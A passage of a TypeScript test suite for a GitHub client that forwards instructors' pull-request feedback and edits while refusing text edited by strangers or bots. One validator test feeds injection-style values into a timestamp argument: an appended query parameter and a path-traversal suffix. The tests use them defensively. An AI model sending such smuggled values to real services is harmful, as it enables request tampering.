      yield* droppedAfter(editorReplyHistory([times[99]!, "tom"], edits(100))),
      [dropOf("7", "unverifiable")],
    );
    // A total larger than the page.
    const nodes: Array<Edit> = [
      [EDIT_AT, "tom"],
      [CREATED, "tom"],
    ];
    assert.isTrue(yield* keptAfter(editorReplyRaw([EDIT_AT, "tom"], nodes, 2)));
    assert.deepStrictEqual(yield* droppedAfter(editorReplyRaw([EDIT_AT, "tom"], nodes, 5)), [
      dropOf("7", "unverifiable"),
    ]);
  }),
);

it.effect("a history whose newest entry is not the latest edit is unverifiable", () =>
  Effect.gen(function* () {
    const last: Edit = [EDIT_AT, "tom"];
    const create: Edit = [CREATED, "tom"];
    for (const nodes of [
      [["2026-10-04T10:19:00Z", "tom"], create],
      [[EDIT_AT, "amy"], create],
      [create],
      [],
    ] as ReadonlyArray<ReadonlyArray<Edit>>) {
      assert.deepStrictEqual(
        yield* droppedAfter(editorReplyRaw(last, nodes, nodes.length)),
        [dropOf("7", "unverifiable")],
        JSON.stringify(nodes),
      );
    }
    assert.isTrue(yield* keptAfter(editorReplyRaw(last, [[EDIT_AT, "tom"], create], 2)));
  }),
);

it.effect(
  "a comment whose last editor is not an instructor is dropped however the history reads",
  () =>
    Effect.gen(function* () {
      const create: Edit = [CREATED, "tom"];
      for (const who of ["stranger", null]) {
        const last: Edit = [EDIT_AT, who];
        for (const nodes of [
          [],
          [[EDIT_AT, "tom"], create],
          [[EDIT_AT, "amy"], create],
          [[EDIT_AT, who], create],
        ] as ReadonlyArray<ReadonlyArray<Edit>>) {
          assert.isFalse(
            yield* keptAfter(editorReplyRaw(last, nodes, nodes.length)),
            `${who} ${JSON.stringify(nodes)}`,
          );
        }
      }
    }),
);

it.effect("a comment that cannot be looked up, or is gone, is dropped and not reported", () =>
  Effect.gen(function* () {
    // No node id, and no `updated_at`: nothing to look up, so no call.
    const noId = { ...editedRestNode(7, "tom", WRITTEN, EDIT_AT, "x"), node_id: null };
    const noUpdate = { ...restNode(8, "tom", WRITTEN, "y"), updated_at: null, node_id: null };
    const t = setup(reply(restReply([noId, noUpdate])), reply(activityBodyReply("b", null)));
    const activity = yield* activityOf(t, ["tom"]);
    assert.deepStrictEqual(activity.comments, []);
    assert.deepStrictEqual(activity.dropped, []);
    assert.deepStrictEqual(t.calls(), [commentsCall, bodyEditCall]);

    // The lookup answers `null` for a comment that is gone.
    const gone = setup(
      reply(restReply([editedRestNode(7, "tom", WRITTEN, EDIT_AT, "x")])),
      reply('{"data":{"nodes":[null]}}'),
      reply(activityBodyReply("b", null)),
    );
    const goneActivity = yield* activityOf(gone, ["tom"]);
    assert.deepStrictEqual(goneActivity.comments, []);
    assert.deepStrictEqual(goneActivity.dropped, []);
  }),
);

it.effect("only edited comments by instructors are looked up, in one call, oldest first", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        restReply([
          editedRestNode(9, "tom", "2026-10-04T10:03:00Z", EDIT_AT, "c"),
          editedRestNode(8, "stranger", "2026-10-04T10:02:00Z", EDIT_AT, "not ours"),
          editedRestNode(7, "tom", WRITTEN, EDIT_AT, "a"),
          restNode(5, "stranger", "2026-10-04T10:04:00Z", "plain"),
        ]),
      ),
      // GitHub promises no order for the nodes.
      reply(
        editorsReply(editorReply([EDIT_AT, "stranger"], "IC_9"), editorReply([EDIT_AT, "tom"])),
      ),
      reply(activityBodyReply("b", null)),
    );
    const activity = yield* activityOf(t, ["tom"]);
    assert.deepStrictEqual(idsOf(activity), ["7"]);
    assert.deepStrictEqual(activity.dropped, [dropOf("9", "edited-by-other")]);
    assert.deepStrictEqual(t.calls(), [commentsCall, editorCall("IC_7", "IC_9"), bodyEditCall]);
  }),
);

it.effect("edited comments are looked up 100 to a call", () =>
  Effect.gen(function* () {
    const ids = Array.from({ length: 101 }, (_, i) => 1000 + i);
    const at = (i: number) =>
      `2026-10-04T10:${String(Math.floor(i / 60)).padStart(2, "0")}:${String(i % 60).padStart(2, "0")}Z`;
    const answer = (some: ReadonlyArray<number>) =>
      editorsReply(...some.map((id) => editorReply([EDIT_AT, "tom"], `IC_${id}`)));
    const t = setup(
      reply(restReply(ids.map((id, i) => editedRestNode(id, "tom", at(i + 1), EDIT_AT, "x")))),
      reply(answer(ids.slice(0, 100))),
      reply(answer(ids.slice(100))),
      reply(activityBodyReply("b", null)),
    );
    const activity = yield* activityOf(t, ["tom"]);
    assert.strictEqual(activity.comments.length, 101);
    assert.deepStrictEqual(t.calls(), [
      commentsCall,
      editorCall(...ids.slice(0, 100).map((id) => `IC_${id}`)),
      editorCall(`IC_${ids[100]}`),
      bodyEditCall,
    ]);
  }),
);

it.effect(
  "dropped comments are listed oldest first beside the forwardable ones, and the body edit is left alone",
  () =>
    Effect.gen(function* () {
      const t = setup(
        reply(
          restReply([
            editedRestNode(9, "tom", "2026-10-04T10:03:00Z", EDIT_AT, "c"),
            restNode(8, "tom", "2026-10-04T10:02:00Z", "kept"),
            editedRestNode(7, "tom", "2026-10-04T10:01:00Z", EDIT_AT, "a"),
          ]),
        ),
        reply(
          editorsReply(
            editorReply([EDIT_AT, "stranger"]),
            editorReplyRaw([EDIT_AT, "tom"], [], 0, "IC_9"),
          ),
        ),
        reply(activityBodyReply("new body", [EDIT_AT, "tom"])),
      );
      const activity = yield* activityOf(t, ["tom"]);
      assert.deepStrictEqual(idsOf(activity), ["8"]);
      assert.deepStrictEqual(activity.dropped, [
        dropOf("7", "edited-by-other"),
        dropOf("9", "unverifiable"),
      ]);
      assert.strictEqual(activity.bodyEdit?.body, "new body");
    }),
);

it.effect("a failing or unreadable editor lookup is an error", () =>
  Effect.gen(function* () {
    const list = restReply([editedRestNode(7, "tom", WRITTEN, EDIT_AT, "x")]);
    const failing = setup(reply(list), fail(1, "boom"));
    const error = yield* failing.err(failing.github.activitySince(6, ACT_SINCE, ["tom"]));
    assert.strictEqual(error._tag, "GitHubFailed");
    assert.deepStrictEqual(argsOf(error), editorCall("IC_7"));
    const oldShape =
      '{"data":{"nodes":[{"id":"IC_7","lastEditedAt":"2026-10-04T10:20:00Z","editor":{"login":"tom"}}]}}';
    const noTotal =
      '{"data":{"nodes":[{"id":"IC_7","lastEditedAt":null,"editor":null,"userContentEdits":{"nodes":[]}}]}}';
    for (const bad of [oldShape, noTotal, "nope", '{"errors":[{"message":"x"}]}']) {
      const t = setup(reply(list), reply(bad));
      const parse = yield* t.err(t.github.activitySince(6, ACT_SINCE, ["tom"]));
      assert.strictEqual(parse._tag, "GitHubParse", bad);
    }
  }),
);

it.effect("a body edit by an instructor after since is the activity's body edit", () =>
  Effect.gen(function* () {
    const t = setup(
      reply("[]"),
      reply(activityBodyReply("new body", ["2026-10-04T10:30:00Z", "Tom"])),
    );
    assert.deepStrictEqual((yield* activityOf(t, ["tom"])).bodyEdit, {
      editedAt: "2026-10-04T10:30:00Z",
      editor: "Tom",
      body: "new body",
    });
  }),
);

it.effect(
  "no body edit when its editor is not an instructor, it was never edited, or it is not after since",
  () =>
    Effect.gen(function* () {
      const stranger = setup(
        reply("[]"),
        reply(activityBodyReply("b", ["2026-10-04T10:30:00Z", "stranger"])),
      );
      assert.strictEqual((yield* activityOf(stranger, ["tom"])).bodyEdit, null);
      const never = setup(reply("[]"), reply(activityBodyReply("b", null)));
      assert.strictEqual((yield* activityOf(never, ["tom"])).bodyEdit, null);
      const earlier = setup(
        reply("[]"),
        reply(activityBodyReply("b", ["2026-10-04T09:30:00Z", "tom"])),
      );
      assert.strictEqual((yield* activityOf(earlier, ["tom"])).bodyEdit, null);
      const equal = setup(reply("[]"), reply(activityBodyReply("b", [ACT_SINCE, "tom"])));
      assert.strictEqual((yield* activityOf(equal, ["tom"])).bodyEdit, null);
    }),
);

it.effect(
  "a stranger's edit after since keeps the body from being forwarded, whoever edited last",
  () =>
    Effect.gen(function* () {
      // The body shown is the whole current body: a stranger's edit followed by an instructor's
      // typo fix would carry the stranger's text under the instructor's name.
      const last: Edit = ["2026-10-04T10:40:00Z", "tom"];
      const history: Array<Edit> = [[CREATED, "tom"], ["2026-10-04T10:30:00Z", "stranger"], last];
      const t = setup(reply("[]"), reply(bodyReplyRaw("b", last, newestFirst(history), 3)));
      assert.strictEqual((yield* activityOf(t, ["tom"])).bodyEdit, null);
      // An edit before since by a stranger does not matter.
      const early: Array<Edit> = [
        [CREATED, "stranger"],
        ["2026-10-04T10:30:00Z", "tom"],
      ];
      const fine = setup(
        reply("[]"),
        reply(bodyReplyRaw("b", ["2026-10-04T10:30:00Z", "tom"], newestFirst(early), 2)),
      );
      assert.strictEqual(
        (yield* activityOf(fine, ["tom"])).bodyEdit?.editedAt,
        "2026-10-04T10:30:00Z",
      );
    }),
);

it.effect("a body edit by an App with an instructor's login is not forwarded", () =>
  Effect.gen(function* () {
    const bot = botOf("tom");
    const at = "2026-10-04T10:30:00Z";
    // The last editor is the App.
    const lastBot: Edit = [at, bot];
    const a = setup(
      reply("[]"),
      reply(bodyReplyRaw("b", lastBot, newestFirst([[CREATED, "tom"], lastBot]), 2)),
    );
    assert.strictEqual((yield* activityOf(a, ["tom"])).bodyEdit, null);
    // The last editor is the person, but the App edited in between: the whole body is shown.
    const last: Edit = ["2026-10-04T10:40:00Z", "tom"];
    const history: Array<Edit> = [[CREATED, "tom"], lastBot, last];
    const b = setup(reply("[]"), reply(bodyReplyRaw("b", last, newestFirst(history), 3)));
    assert.strictEqual((yield* activityOf(b, ["tom"])).bodyEdit, null);
    // An editor that does not say what it is fails closed.
    const bare = bodyReplyRaw(
      "b",
      [at, "tom"],
      newestFirst([
        [CREATED, "tom"],
        [at, "tom"],
      ]),
      2,
    ).replaceAll('"__typename":"User",', "");
    const c = setup(reply("[]"), reply(bare));
    assert.strictEqual((yield* activityOf(c, ["tom"])).bodyEdit, null);
    // The guard on the last editor alone: an App last editor, a history that looks like the person's.
    const e = setup(
      reply("[]"),
      reply(
        bodyReplyRaw(
          "b",
          [at, bot],
          newestFirst([
            [CREATED, "tom"],
            [at, "tom"],
          ]),
          2,
        ),
      ),
    );
    assert.strictEqual((yield* activityOf(e, ["tom"])).bodyEdit, null);
    // The person alone is still forwarded.
    const d = setup(reply("[]"), reply(activityBodyReply("b", [at, "tom"])));
    assert.strictEqual((yield* activityOf(d, ["tom"])).bodyEdit?.editedAt, at);
  }),
);

it.effect("a comment edited by an App with an instructor's login is dropped once", () =>
  Effect.gen(function* () {
    const bot = botOf("tom");
    assert.deepStrictEqual(yield* droppedAfter(editorReply([EDIT_AT, bot])), [
      dropOf("7", "edited-by-other"),
    ]);
    // The person edited last, but the App edited in between.
    const last: Edit = ["2026-10-04T10:25:00Z", "tom"];
    const history: Array<Edit> = [[CREATED, "tom"], [EDIT_AT, bot], last];
    assert.deepStrictEqual(yield* droppedAfter(editorReplyHistory(last, history)), [
      dropOf("7", "edited-by-other"),
    ]);
    // The App edited last and the history is cut off: the last editor decides, not the cut-off.
    const cut: Array<Edit> = [
      [EDIT_AT, "tom"],
      [CREATED, "tom"],
    ];
    assert.deepStrictEqual(yield* droppedAfter(editorReplyRaw([EDIT_AT, bot], cut, 5)), [
      dropOf("7", "edited-by-other"),
    ]);
  }),
);

it.effect(
  "a body edit history that may be cut off, or whose newest entry is not the latest edit, is not forwarded",
  () =>
    Effect.gen(function* () {
      const last: Edit = ["2026-10-04T10:05:00Z", "tom"];
      // A total one above the page: one edit is hidden.
      const nodes: Array<Edit> = [last, [CREATED, "tom"]];
      const whole = setup(reply("[]"), reply(bodyReplyRaw("b", last, nodes, 2)));
      assert.isNotNull((yield* activityOf(whole, ["tom"])).bodyEdit);
      const hidden = setup(reply("[]"), reply(bodyReplyRaw("b", last, nodes, 3)));
      assert.isNull((yield* activityOf(hidden, ["tom"])).bodyEdit);
      // A full page, even when only its newest entry is after since.
      const older = Array.from({ length: 99 }, (_, i): Edit => [
        `2026-10-04T09:${pad(Math.floor(i / 60))}:${pad(i % 60)}Z`,
        "tom",
      ]);
      const page: Array<Edit> = [last, ...older.toReversed()];
      assert.strictEqual(page.length, 100);
      const full = setup(reply("[]"), reply(bodyReplyRaw("b", last, page, 100)));
      assert.isNull((yield* activityOf(full, ["tom"])).bodyEdit);
      const short = setup(reply("[]"), reply(bodyReplyRaw("b", last, page.slice(0, 99), 99)));
      assert.isNotNull((yield* activityOf(short, ["tom"])).bodyEdit);
      // The newest entry is not the latest edit.
      const stale = setup(
        reply("[]"),
        reply(
          bodyReplyRaw(
            "b",
            last,
            [
              ["2026-10-04T10:04:00Z", "tom"],
              [CREATED, "tom"],
            ],
            2,
          ),
        ),
      );
      assert.isNull((yield* activityOf(stale, ["tom"])).bodyEdit);
      const empty = setup(reply("[]"), reply(bodyReplyRaw("b", last, [], 0)));
      assert.isNull((yield* activityOf(empty, ["tom"])).bodyEdit);
    }),
);

it.effect(
  "activity errors name the call that failed, and a failed comments call makes no second",
  () =>
    Effect.gen(function* () {
      const comments = setup(fail(1, "Not Found"));
      const failed = yield* comments.err(comments.github.activitySince(6, ACT_SINCE, ["tom"]));
      assert.strictEqual(failed._tag, "GitHubFailed");
      assert.deepStrictEqual(argsOf(failed), commentsCall);
      assert.strictEqual(comments.calls().length, 1);

      const body = setup(reply("[]"), fail(1, "Could not resolve to an Issue"));
      const bodyFailed = yield* body.err(body.github.activitySince(6, ACT_SINCE, ["tom"]));
      assert.strictEqual(bodyFailed._tag, "GitHubFailed");
      assert.deepStrictEqual(argsOf(bodyFailed), bodyEditCall);

      for (const bad of ["nope", '{"data":{"repository":null}}', '{"errors":[{"message":"x"}]}']) {
        const t = setup(reply("[]"), reply(bad));
        assert.strictEqual(
          (yield* t.err(t.github.activitySince(6, ACT_SINCE, ["tom"])))._tag,
          "GitHubParse",
          bad,
        );
      }

      const notJson = setup(reply("not json"));
      const parse = yield* notJson.err(notJson.github.activitySince(6, ACT_SINCE, ["tom"]));
      assert.strictEqual(parse._tag, "GitHubParse");
      assert.deepStrictEqual(argsOf(parse), commentsCall);

      const spawn = setup(spawnError());
      assert.strictEqual(
        (yield* spawn.err(spawn.github.activitySince(6, ACT_SINCE, ["tom"])))._tag,
        "GitHubSpawnError",
      );
    }),
);

it.effect("activity with a malformed repo is a parse error without calling gh", () =>
  Effect.gen(function* () {
    const t = setup();
    const github = makeGitHub({ repo: "no-slash", ghConfigDir: GH_CONFIG_DIR });
    const error = yield* t.err(github.activitySince(6, ACT_SINCE, ["tom"]));
    assert.strictEqual(error._tag, "GitHubParse");
    assert.deepStrictEqual(t.calls(), []);
  }),
);

it.effect("activity with a malformed since is a parse error without calling gh", () =>
  Effect.gen(function* () {
    for (const bad of [
      "",
      "yesterday",
      "2026-10-04",
      "2026-10-04T10:00:00",
      "2026-10-04T10:00:00+10:00",
      "2026-10-04 10:00:00Z",
      "2026-10-04T10:00:00.000Z",
      "2026-10-04T10:00:00Z&per_page=1",
      "2026-10-04T10:00:00Z/../../x",
      "2026-10-04T10:00:00Z\n",
      "2026-1O-04T10:00:00Z",
      " 2026-10-04T10:00:00Z",
      "２０２６-10-04T10:00:00Z",
    ]) {
      const t = setup();
      const error = yield* t.err(t.github.activitySince(6, bad, ["tom"]));
      assert.strictEqual(error._tag, "GitHubParse", JSON.stringify(bad));
      assert.deepStrictEqual(t.calls(), [], JSON.stringify(bad));
    }
  }),
);

describe("pr feedback", () => {
  type Json = Record<string, unknown>;

  /** The moment the feedback tests read from: everything after it is new. */
  const FB_SINCE = "2026-10-04T10:30:00Z";
  const RAWPHP = ["rawphp"];

  const person = (login: string): Json => ({ __typename: "User", login });

  const feedbackCall = (query: string, ...rest: ReadonlyArray<string>) => [
    "api",
    "graphql",
    "-f",
    `query=${query}`,
    "-f",
    "owner=rawphp",
    "-f",
    "name=softfac",
    "-F",
    "number=6",
    ...rest,
  ];
  const beforeCall = (cursor: string) =>
    feedbackCall(REVIEWS_BEFORE_QUERY, "-f", `before=${cursor}`);

  const feedbackReply = (reviews: ReadonlyArray<Json>, comments: ReadonlyArray<Json>) =>
    JSON.stringify({
      data: {
        repository: { pullRequest: { reviews: { nodes: reviews }, comments: { nodes: comments } } },
      },
    });
  /** A reply whose reviews connection says how many there are in all and where its first node starts. */
  const pagedReply = (
    reviews: ReadonlyArray<Json>,
    comments: ReadonlyArray<Json>,
    total: number,
    cursor: string,
  ) =>
    JSON.stringify({
      data: {
        repository: {
          pullRequest: {
            reviews: { totalCount: total, pageInfo: { startCursor: cursor }, nodes: reviews },
            comments: { nodes: comments },
          },
        },
      },
    });
  /** A reply to the paging query. */
  const reviewsPage = (reviews: ReadonlyArray<Json>, total: number, cursor: string) =>
    JSON.stringify({
      data: {
        repository: {
          pullRequest: {
            reviews: { totalCount: total, pageInfo: { startCursor: cursor }, nodes: reviews },
          },
        },
      },
    });
  const GONE = JSON.stringify({ data: { repository: { pullRequest: null } } });

  const reviewNode = (
    id: number | string,
    state: string,
    body: string,
    at: string | null,
    author: string,
    inline: ReadonlyArray<Json> = [],
  ): Json => ({
    fullDatabaseId: String(id),
    state,
    body,
    submittedAt: at,
    author: person(author),
    lastEditedAt: null,
    editor: null,
    comments: { nodes: inline },
  });
  const inlineNode = (
    body: string,
    path: string,
    line: number | null,
    author: string,
    originalLine: number | null = 5,
  ): Json => ({ body, path, line, originalLine, author: person(author) });
  const prCommentNode = (id: number | string, body: string, at: string, author: string): Json => ({
    fullDatabaseId: String(id),
    body,
    createdAt: at,
    author: person(author),
    lastEditedAt: null,
    editor: null,
  });

  const readWith = (t: ReturnType<typeof setup>, since = FB_SINCE, floor = FB_SINCE) =>
    t.ok(t.github.prFeedback(6, since, floor, RAWPHP));
  const errorWith = (t: ReturnType<typeof setup>, since = FB_SINCE, floor = FB_SINCE) =>
    t.err(t.github.prFeedback(6, since, floor, RAWPHP));
  const readFeedback = (answer: string) => readWith(setup(reply(answer)));
  const feedbackIds = (items: ReadonlyArray<Feedback>) => items.map((f) => f.id);

  it.effect("asks for the reviews and conversation comments with one call", () =>
    Effect.gen(function* () {
      const t = setup(reply(feedbackReply([], [])));
      yield* readWith(t);
      assert.deepStrictEqual(t.calls(), [feedbackCall(PR_FEEDBACK_QUERY)]);
    }),
  );

  it.effect("reads a real answer to the feedback query by the rules", () =>
    Effect.gen(function* () {
      const live = NodeFS.readFileSync(
        NodePath.join(import.meta.dirname, "fixtures", "pr_feedback_cli_9000.json"),
        "utf8",
      );
      const t = setup(reply(live));
      const items = yield* t.ok(
        t.github.prFeedback(9000, "2024-04-01T00:00:00Z", "2024-04-01T00:00:00Z", [
          "williammartin",
        ]),
      );
      // Review 2028948315 approves with a body that ends in "LGTM!" and no inline comment, so
      // it is not feedback.
      assert.deepStrictEqual(feedbackIds(items), ["pr-comment:2082274688", "review:2028628010"]);
      assert.deepStrictEqual(items[1]?.kind, { kind: "review", state: "COMMENTED" });
      assert.deepStrictEqual(
        items[1]?.inline.map((c) => [c.path, c.line]),
        [
          ["pkg/cmd/attestation/verify/verify.go", 130],
          ["pkg/cmdutil/auth_check_test.go", 113],
        ],
      );
      // Someone else's review and comments are not feedback.
      assert.isTrue(items.every((i) => i.author === "williammartin"));
    }),
  );

  it("the feedback query asks for what the rules judge", () => {
    for (const part of [
      "pullRequest(number: $number)",
      "reviews(last: 50) { totalCount pageInfo { startCursor } nodes {",
      "comments(last: 100)",
      "comments(first: 50)",
      "fullDatabaseId",
      "submittedAt",
      "lastEditedAt",
      "editor { __typename login }",
      "author { __typename login }",
      "originalLine",
      "comments(first: 50) { totalCount nodes { id body path line originalLine",
      "userContentEdits(first: 20)",
      "totalCount nodes { editedAt editor { __typename login } }",
    ]) {
      assert.isTrue(PR_FEEDBACK_QUERY.includes(part), `missing ${part}`);
    }
    // The review's and the conversation comment's histories, and no history on the inline
    // comments: those are read one comment at a time, only where one was edited.
    assert.strictEqual(PR_FEEDBACK_QUERY.split("userContentEdits(first: 20)").length - 1, 2);
    assert.isFalse(PR_FEEDBACK_QUERY.includes("reviews(last: 100)"));
    assert.isFalse(PR_FEEDBACK_QUERY.includes("comments(first: 100)"));
  });

  /** The text of the `{ ... }` that follows the first `reviews(` in `query`. */
  const reviewsSelection = (query: string): string => {
    const from = query.indexOf("reviews(");
    const open = query.indexOf("{", from);
    let depth = 0;
    for (let at = open; at < query.length; at += 1) {
      if (query[at] === "{") depth += 1;
      if (query[at] === "}") {
        depth -= 1;
        if (depth === 0) return query.slice(open, at + 1);
      }
    }
    throw new Error(`no closing brace for the reviews selection in ${query}`);
  };

  it("both feedback queries select the same review fields", () => {
    const first = reviewsSelection(PR_FEEDBACK_QUERY);
    assert.isTrue(first.includes("fullDatabaseId"));
    assert.strictEqual(first, reviewsSelection(REVIEWS_BEFORE_QUERY));
  });

  it("the page limit is twenty pages of fifty reviews", () => {
    assert.strictEqual(REVIEW_PAGE_LIMIT, 20);
    assert.isTrue(REVIEWS_BEFORE_QUERY.includes("reviews(last: 50, before: $before)"));
  });

  it.effect(
    "an instructor review is feedback with its inline comments and their path and line",
    () =>
      Effect.gen(function* () {
        const inline = inlineNode("rename this", "src/a.rs", 7, "rawphp");
        const got = yield* readFeedback(
          feedbackReply(
            [
              reviewNode(11, "CHANGES_REQUESTED", "please fix", "2026-10-04T11:00:00Z", "rawphp", [
                inline,
              ]),
            ],
            [],
          ),
        );
        assert.deepStrictEqual(got, [
          {
            id: "review:11",
            author: "rawphp",
            kind: { kind: "review", state: "CHANGES_REQUESTED" },
            createdAt: "2026-10-04T11:00:00Z",
            body: "please fix",
            inline: [{ path: "src/a.rs", line: 7, body: "rename this" }],
            inlineUnread: 0,
          },
        ]);
      }),
  );

  it.effect("ids past what a 32-bit integer holds are read from the full database id", () =>
    Effect.gen(function* () {
      const got = yield* readFeedback(
        feedbackReply(
          [reviewNode(6_082_131_994, "COMMENTED", "big", "2026-10-04T11:00:00Z", "rawphp")],
          [prCommentNode(5_700_000_001, "also big", "2026-10-04T11:01:00Z", "rawphp")],
        ),
      );
      assert.deepStrictEqual(feedbackIds(got), ["review:6082131994", "pr-comment:5700000001"]);
    }),
  );

  it.effect("a commented review and a conversation comment are feedback, oldest first", () =>
    Effect.gen(function* () {
      const got = yield* readFeedback(
        feedbackReply(
          [reviewNode(11, "COMMENTED", "later", "2026-10-04T12:00:00Z", "rawphp")],
          [prCommentNode(21, "first", "2026-10-04T11:00:00Z", "rawphp")],
        ),
      );
      assert.deepStrictEqual(
        got.map((f) => [f.id, f.kind]),
        [
          ["pr-comment:21", { kind: "pr-comment" }],
          ["review:11", { kind: "review", state: "COMMENTED" }],
        ],
      );
      assert.strictEqual(got[0]?.body, "first");
      assert.strictEqual(got[0]?.createdAt, "2026-10-04T11:00:00Z");
    }),
  );

  it.effect("someone who is not an instructor, and a bot of the same name, are not feedback", () =>
    Effect.gen(function* () {
      const botComment = {
        ...prCommentNode(22, "hi", "2026-10-04T11:00:00Z", "rawphp"),
        author: { __typename: "Bot", login: "rawphp" },
      };
      const got = yield* readFeedback(
        feedbackReply(
          [reviewNode(11, "CHANGES_REQUESTED", "no", "2026-10-04T11:00:00Z", "stranger")],
          [prCommentNode(21, "hello", "2026-10-04T11:00:00Z", "stranger"), botComment],
        ),
      );
      assert.deepStrictEqual(got, []);
    }),
  );

  it.effect("an author who was deleted is not feedback", () =>
    Effect.gen(function* () {
      const gone = {
        ...prCommentNode(21, "hi", "2026-10-04T11:00:00Z", "rawphp"),
        author: null,
      };
      assert.deepStrictEqual(yield* readFeedback(feedbackReply([], [gone])), []);
    }),
  );

  it.effect("the logins are compared without regard to case", () =>
    Effect.gen(function* () {
      const got = yield* readFeedback(
        feedbackReply([], [prCommentNode(21, "hello", "2026-10-04T11:00:00Z", "RawPHP")]),
      );
      assert.strictEqual(got.length, 1);
    }),
  );

  it.effect("a comment with the factory's marker is never feedback", () =>
    Effect.gen(function* () {
      const got = yield* readFeedback(
        feedbackReply(
          [reviewNode(11, "COMMENTED", "ok <!-- softfac -->", "2026-10-04T11:00:00Z", "rawphp")],
          [
            prCommentNode(21, "gate ok\n\n<!-- softfac -->", "2026-10-04T11:00:00Z", "rawphp"),
            prCommentNode(22, "<!-- softfac:status -->", "2026-10-04T11:00:00Z", "rawphp"),
          ],
        ),
      );
      assert.deepStrictEqual(got, []);
    }),
  );

  it.effect(
    "an approval is feedback only with inline comments; a dismissed review with words or inline comments is too",
    () =>
      Effect.gen(function* () {
        // softfac also counts an approval with a body, so approving with "LGTM!" would send the
        // pull request back to draft and the issue back to building. This port does not.
        const inline = inlineNode("nit", "src/a.rs", 3, "rawphp");
        const got = yield* readFeedback(
          feedbackReply(
            [
              reviewNode(11, "APPROVED", "", "2026-10-04T11:00:00Z", "rawphp"),
              reviewNode(12, "DISMISSED", "  \n", "2026-10-04T11:01:00Z", "rawphp"),
              reviewNode(13, "APPROVED", "LGTM!", "2026-10-04T11:02:00Z", "rawphp"),
              reviewNode(14, "APPROVED", "", "2026-10-04T11:03:00Z", "rawphp", [inline]),
              reviewNode(15, "DISMISSED", "stale", "2026-10-04T11:04:00Z", "rawphp"),
              reviewNode(16, "APPROVED", "one more nit", "2026-10-04T11:05:00Z", "rawphp", [
                inline,
              ]),
            ],
            [],
          ),
        );
        assert.deepStrictEqual(feedbackIds(got), ["review:14", "review:15", "review:16"]);
      }),
  );

  it.effect("a comment and a commented review that only say LGTM are still feedback", () =>
    Effect.gen(function* () {
      // The factory's login opens the pull requests, so an instructor acting as it can only
      // comment: only an approval's body is left unread.
      const got = yield* readFeedback(
        feedbackReply(
          [reviewNode(11, "COMMENTED", "looks good", "2026-10-04T11:00:00Z", "rawphp")],
          [prCommentNode(21, "LGTM, merging after the release", "2026-10-04T11:01:00Z", "rawphp")],
        ),
      );
      assert.deepStrictEqual(feedbackIds(got), ["review:11", "pr-comment:21"]);
    }),
  );

  it.effect("a review that is still pending or has no submission time is not feedback", () =>
    Effect.gen(function* () {
      const got = yield* readFeedback(
        feedbackReply(
          [
            reviewNode(11, "PENDING", "draft", "2026-10-04T11:00:00Z", "rawphp"),
            reviewNode(12, "COMMENTED", "x", null, "rawphp"),
          ],
          [],
        ),
      );
      assert.deepStrictEqual(got, []);
    }),
  );

  it.effect("a review with more inline comments than were read says how many are missing", () =>
    Effect.gen(function* () {
      const shown = Array.from({ length: 100 }, (_, i) =>
        inlineNode(`note ${i}`, "src/a.rs", 7, "rawphp"),
      );
      const withTotal = (review: Json, totalCount: number): Json => ({
        ...review,
        comments: { totalCount, nodes: (review.comments as { nodes: unknown }).nodes },
      });
      const many = yield* readFeedback(
        feedbackReply(
          [
            withTotal(
              reviewNode(11, "COMMENTED", "many", "2026-10-04T11:00:00Z", "rawphp", shown),
              150,
            ),
          ],
          [],
        ),
      );
      assert.strictEqual(many[0]?.inline.length, 100);
      assert.strictEqual(many[0]?.inlineUnread, 50);
      // Read whole, or a count that is no larger than what came: nothing is missing.
      const whole = yield* readFeedback(
        feedbackReply(
          [
            withTotal(
              reviewNode(12, "COMMENTED", "few", "2026-10-04T11:00:00Z", "rawphp", [
                inlineNode("a", "src/a.rs", 1, "rawphp"),
              ]),
              1,
            ),
          ],
          [],
        ),
      );
      assert.strictEqual(whole[0]?.inlineUnread, 0);
    }),
  );

  it.effect(
    "only inline comments by instructors without the marker are kept, and the line falls back",
    () =>
      Effect.gen(function* () {
        const inline = [
          inlineNode("keep", "src/a.rs", 7, "rawphp"),
          inlineNode("stranger", "src/b.rs", 8, "stranger"),
          inlineNode("mine <!-- softfac -->", "src/c.rs", 9, "rawphp"),
          inlineNode("outdated", "src/d.rs", null, "rawphp", 4),
          inlineNode("nowhere", "src/e.rs", null, "rawphp", null),
        ];
        const got = yield* readFeedback(
          feedbackReply(
            [reviewNode(11, "COMMENTED", "", "2026-10-04T11:00:00Z", "rawphp", inline)],
            [],
          ),
        );
        assert.deepStrictEqual(
          got[0]?.inline.map((c) => [c.path, c.line, c.body]),
          [
            ["src/a.rs", 7, "keep"],
            ["src/d.rs", 4, "outdated"],
            ["src/e.rs", null, "nowhere"],
          ],
        );
      }),
  );

  it.effect("only what was written after since is feedback; the same second is not after", () =>
    Effect.gen(function* () {
      const got = yield* readFeedback(
        feedbackReply(
          [reviewNode(11, "COMMENTED", "old", "2026-10-04T10:29:59Z", "rawphp")],
          [
            prCommentNode(21, "same second", FB_SINCE, "rawphp"),
            prCommentNode(22, "new", "2026-10-04T10:30:01Z", "rawphp"),
          ],
        ),
      );
      assert.deepStrictEqual(feedbackIds(got), ["pr-comment:22"]);
    }),
  );

  it.effect("a pull request that is gone has no feedback", () =>
    Effect.gen(function* () {
      assert.deepStrictEqual(yield* readFeedback(GONE), []);
    }),
  );

  it.effect("a since that is not GitHub's form is refused before gh runs", () =>
    Effect.gen(function* () {
      for (const since of ["", "2026-10-04", "2026-10-04 10:30:00", "2026-10-04T10:30:00.5Z"]) {
        const t = setup();
        const error = yield* errorWith(t, since, since);
        assert.strictEqual(error._tag, "GitHubParse", JSON.stringify(since));
        assert.deepStrictEqual(t.calls(), [], JSON.stringify(since));
      }
    }),
  );

  it.effect("a floor that is not GitHub's form is refused before gh runs", () =>
    Effect.gen(function* () {
      for (const floor of ["", "2026-10-04", "2026-10-04T10:30:00.5Z"]) {
        const t = setup();
        const error = yield* errorWith(t, FB_SINCE, floor);
        assert.strictEqual(error._tag, "GitHubParse", JSON.stringify(floor));
        assert.deepStrictEqual(t.calls(), [], JSON.stringify(floor));
      }
    }),
  );

  it.effect("feedback with a time or id it cannot read is an error and not a guess", () =>
    Effect.gen(function* () {
      const noId = {
        ...prCommentNode(21, "hi", "2026-10-04T11:00:00Z", "rawphp"),
        fullDatabaseId: null,
      };
      const badTime = prCommentNode(21, "hi", "yesterday", "rawphp");
      const notANumber = prCommentNode("abc", "hi", "2026-10-04T11:00:00Z", "rawphp");
      for (const comment of [noId, badTime, notANumber]) {
